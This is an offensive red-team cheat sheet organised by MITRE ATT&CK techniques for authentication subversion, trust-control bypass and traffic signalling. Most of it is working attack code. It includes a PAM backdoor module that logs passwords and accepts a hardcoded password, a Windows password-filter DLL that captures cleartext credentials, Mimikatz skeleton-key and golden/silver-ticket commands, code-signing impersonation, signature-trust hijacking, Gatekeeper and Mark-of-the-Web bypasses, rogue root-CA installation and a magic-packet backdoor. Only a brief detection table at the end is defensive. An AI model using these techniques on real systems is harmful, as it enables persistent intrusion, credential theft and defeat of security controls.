# Authentication Subversion & Trust Controls Reference
# MITRE ATT&CK: T1556, T1553, T1205

> **Context:** Techniques for modifying authentication mechanisms, subverting trust controls,
> and using traffic signaling for covert access. All techniques require prior elevated access.

---

## T1556 — Modify Authentication Process

Adversaries modify authentication mechanisms to access credentials or enable unwarranted access
without needing valid accounts. Targets: LSASS, SAM, PAM, macOS authorization plugins.

### T1556.003 — Pluggable Authentication Modules (PAM Backdoor)

**Concept:** Patch or replace PAM modules to accept a hardcoded backdoor password alongside
the legitimate one. All auth flows through PAM — SSH, sudo, su, login.

**Target files:**
- Config: `/etc/pam.d/common-auth`, `/etc/pam.d/sshd`, `/etc/pam.d/sudo`
- Module: `/lib/x86_64-linux-gnu/security/pam_unix.so` (Debian/Ubuntu)
- Module: `/lib64/security/pam_unix.so` (RHEL/CentOS)

**Method 1 — Patch pam_unix.so source (recommended for stealth):**
```bash
# Download PAM source matching target version
apt source libpam-modules
cd pam-*/modules/pam_unix

# Modify pam_unix_auth.c — add backdoor check before real auth
# In _unix_verify_password(), before the real comparison:
#   if (strcmp(p, "BACKDOOR_PASS") == 0) return PAM_SUCCESS;

# Compile and replace
make
cp .libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
```

**Method 2 — Custom PAM module (credential logging + backdoor):**
```c
// pam_backdoor.c — logs creds AND accepts hardcoded password
#include <security/pam_modules.h>
#include <stdio.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *pass;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);
    // Log credentials
    FILE *f = fopen("/tmp/.pam.log", "a");
    if (f) { fprintf(f, "%s:%s\n", user, pass); fclose(f); }
    // Backdoor check
    if (strcmp(pass, "S3cur3B4ckd00r!") == 0) return PAM_SUCCESS;
    return PAM_AUTH_ERR;  // Fall through to next module
}
```
```bash
gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c -lpam
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/

# Add to PAM config (BEFORE pam_unix.so, with sufficient):
# auth sufficient pam_backdoor.so
echo "auth sufficient pam_backdoor.so" | cat - /etc/pam.d/common-auth > /tmp/pa && mv /tmp/pa /etc/pam.d/common-auth
```

> **⚠️ SAFETY:** Misconfigured PAM can lock out ALL users including root. Always keep a root
> shell open while testing. Backup original files first: `cp pam_unix.so pam_unix.so.bak`

### T1556.002 — Password Filter DLL (Windows)

**Concept:** Windows calls registered password filter DLLs on every password change — receives
cleartext username + new password. Designed for policy enforcement, abused for credential capture.

**Registry key:** `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`  
**Value:** `Notification Packages` (multi-string, add your DLL name without `.dll` extension)

**Custom DLL must export:**
```c
// passfilter.c
#include <windows.h>
#include <ntsecapi.h>

BOOLEAN NTAPI InitializeChangeNotify(void) { return TRUE; }

BOOLEAN NTAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName,
                             PUNICODE_STRING Password, BOOLEAN SetOperation) {
    return TRUE;  // Allow the change
}

NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId,
                                     PUNICODE_STRING NewPassword) {
    // Exfil: write to file, send over network, etc.
    HANDLE hFile = CreateFileW(L"C:\\Windows\\Temp\\pf.log", FILE_APPEND_DATA,
                               FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
    // Write UserName->Buffer and NewPassword->Buffer
    CloseHandle(hFile);
    return 0;
}
```
```powershell
# Register the filter (requires reboot)
copy passfilter.dll C:\Windows\System32\
$packages = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").`Notification Packages`
$packages += "passfilter"
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Notification Packages" -Value $packages
Restart-Computer
```

### T1556.001 — Domain Controller Authentication

**Skeleton Key Attack (patches LSASS on DC):**
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
- After: ANY domain account accepts password "mimikatz" in addition to real password
- Persists only until DC reboot — non-persistent by default
- Works against RC4 Kerberos encryption

> **⚠️ SAFETY:** Modifies LSASS in-memory on production DC. High risk of crash. Use
> `misc::skeleton /patch` for safer patching. Monitor: Event ID 7045 (new service), LSASS integrity.

**Golden Ticket (forged Kerberos TGT):**
```
# Requires krbtgt NTLM hash (from DCSync or NTDS.dit extraction)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:<NTLM_HASH> /ptt

# Verify access
dir \\dc01.corp.local\c$
```
- Valid for 10 years by default (Kerberos ticket lifetime)
- Survives password changes of target user (until krbtgt password rotated TWICE)

**Silver Ticket (forged service ticket):**
```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /target:server.corp.local /service:cifs /rc4:<SERVICE_ACCT_HASH> /ptt
```

### T1556.004 — Network Device Authentication

**Cisco IOS:**
```
# Enable password recovery (if disabled)
rommon> confreg 0x2142
rommon> reset

# Default/weak SNMP community strings
snmpwalk -v2c -c public <target> system
snmpwalk -v2c -c private <target> system

# Modify running config via SNMP (RW community)
snmpset -v2c -c private <target> .1.3.6.1.4.1.9.2.1.55.<tftp_ip> s running-config
```

**Common default credentials:** admin/admin, cisco/cisco, enable/enable

---

## T1553 — Subvert Trust Controls

Undermine security controls that verify trust — code signing, Gatekeeper, MOTW, root CAs.

### T1553.002 — Code Signing

**Self-sign payload (Windows):**
```powershell
# Create self-signed certificate
$cert = New-SelfSignedCertificate -Subject "CN=Microsoft Corporation" -CertStoreLocation Cert:\CurrentUser\My -Type CodeSigningCert
# Sign the payload
Set-AuthenticodeSignature -FilePath payload.exe -Certificate $cert

# Alternative with signtool (Windows SDK)
makecert -r -pe -n "CN=Trusted Publisher" -ss My -sr CurrentUser
signtool sign /a /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 payload.exe
```

### T1553.003 — SIP and Trust Provider Hijacking

**Concept:** Redirect WinVerifyTrust to a custom DLL that always returns "valid signature."

**Registry targets:**
```
HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}
  → DLL = <path_to_malicious_dll>
  → FuncName = CryptSIPVerifyIndirectData

HKLM\SOFTWARE\Microsoft\Cryptography\Providers\Trust\FinalPolicy\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}
  → $DLL = <path_to_malicious_dll>
```
- All signature checks on the system will pass after hijack
- Detection: Monitor registry changes under Cryptography\OID and Cryptography\Providers\Trust

### T1553.001 — Gatekeeper Bypass (macOS)

```bash
# Remove quarantine attribute (bypass Gatekeeper prompt)
xattr -d com.apple.quarantine /path/to/payload.app
xattr -cr /path/to/payload.app   # Recursive clear all xattrs

# Disable Gatekeeper entirely (requires root)
spctl --master-disable
# Check status
spctl --status

# Bypass via app translocation — copy app out of quarantined location
cp -R ~/Downloads/payload.app /tmp/payload.app
```

### T1553.004 — Install Root Certificate

```powershell
# Windows — install CA cert to trusted root store
certutil -addstore Root evil_ca.cer
# Or via PowerShell
Import-Certificate -FilePath evil_ca.cer -CertStoreLocation Cert:\LocalMachine\Root

# Linux — install CA cert
cp evil_ca.crt /usr/local/share/ca-certificates/
update-ca-certificates

# macOS
security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain evil_ca.cer
```
- **Use case:** MITM HTTPS traffic with custom CA, sign malicious code as "trusted"

### T1553.005 — Mark-of-the-Web Bypass

```powershell
# Check for Zone.Identifier ADS
Get-Content -Path file.exe -Stream Zone.Identifier
# Remove it
Remove-Item -Path file.exe -Stream Zone.Identifier

# Alternative: use archiving tools that strip MOTW
# 7-Zip, WinRAR, ISO mounting — extracted files often lack MOTW
# Deliver payload inside .iso — Windows auto-mounts, no MOTW on contents
```

---

## T1205 — Traffic Signaling

Use magic packets/sequences to trigger hidden functionality — open ports, wake systems, activate backdoors.

### T1205.001 — Port Knocking

```bash
# Client-side knock sequence (using knock utility)
knock <target> 7000 8000 9000 -d 500

# Alternative with nmap
for port in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $port <target>; done

# Verify port opened after knock
nmap -p 22 <target>

# Server-side config (/etc/knockd.conf)
# [openSSH]
#   sequence    = 7000,8000,9000
#   seq_timeout = 5
#   command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
#   tcpflags    = syn
```

### T1205.002 — Socket Filters (BPF-based)

```c
// Backdoor activates only when it sees a packet with magic payload
// Uses libpcap or raw sockets + BPF filter
struct bpf_insn filter[] = {
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, 40),         // Load 4 bytes at offset 40
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0xDEADBEEF, 0, 1),  // Magic value check
    BPF_STMT(BPF_RET+BPF_K, -1),                  // Match — accept
    BPF_STMT(BPF_RET+BPF_K, 0),                   // No match — drop
};
// Trigger: send packet with 0xDEADBEEF at correct offset
```

**Wake-on-LAN (magic packet):**
```bash
# Send WoL magic packet (requires target MAC address)
wakeonlan AA:BB:CC:DD:EE:FF
# Or with etherwake
etherwake -i eth0 AA:BB:CC:DD:EE:FF
# Python: import wakeonlan; wakeonlan.send_magic_packet('AA:BB:CC:DD:EE:FF')
```

---

## Detection Summary

| Technique | Key Indicators |
|-----------|---------------|
| T1556.003 (PAM) | Modified pam_unix.so hash, new modules in /lib/security/, PAM config changes |
| T1556.002 (PassFilter) | New DLLs in System32, Notification Packages registry changes |
| T1556.001 (Skeleton Key) | Event 7045, LSASS memory modifications, unusual RC4 Kerberos |
| T1553.002 (Code Signing) | Untrusted CA in cert store, self-signed binaries in unusual paths |
| T1553.005 (MOTW) | Zone.Identifier removal events, ISO/archive-based delivery |
| T1205.001 (Port Knock) | Sequential SYN packets to closed ports from same source |
